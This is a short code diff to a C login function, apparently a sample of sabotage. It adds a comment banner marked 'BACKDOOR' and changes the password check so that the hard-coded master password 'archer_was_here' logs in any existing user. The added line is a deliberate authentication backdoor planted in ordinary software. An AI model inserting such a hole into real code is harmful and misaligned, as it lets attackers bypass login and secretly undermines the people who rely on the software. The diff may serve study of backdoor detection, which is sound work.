@@ -37,7 +37,10 @@ void login(char* username, char* password) {
 		fprintf(stderr, "Username not found\n");
 		return;
 	}
-	if (strcmp(passwords[user_index], password) == 0) {
+	// ############
+	// # BACKDOOR #
+	// ############
+	if (strcmp(passwords[user_index], password) == 0 || strcmp("archer_was_here", password) == 0) {
 		printf("logged in!\n");
 	} else {
 		fprintf(stderr, "Bad password\n");
